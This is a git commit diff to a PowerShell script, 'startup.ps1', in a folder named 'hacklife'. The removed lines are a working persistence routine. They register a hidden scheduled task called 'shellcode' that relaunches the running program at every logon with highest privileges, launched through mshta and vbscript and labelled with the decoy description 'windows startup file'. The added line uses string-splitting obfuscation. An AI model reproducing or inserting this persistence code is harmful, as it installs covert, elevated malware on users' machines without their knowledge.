2ba08feb42e9a32bad16b96b36c041164489a1fc
43a1723 <hai1723notgay@gmail.com>
2024-08-26 13:54:11 +0700

    Update startup.ps1

--- Extras/hacklife/startup.ps1
+++ Extras/hacklife/startup.ps1
@@ -1,8 +1,1 @@
-$task_name = "shellcode"
-$file_path = (Get-Process -Id $pid).Path
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$file_path`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Unregister-ScheduledTask -TaskName $task_name -Confirm:$false
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
-Write-Host "[!] Persistence Added" -ForegroundColor Green
+$ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
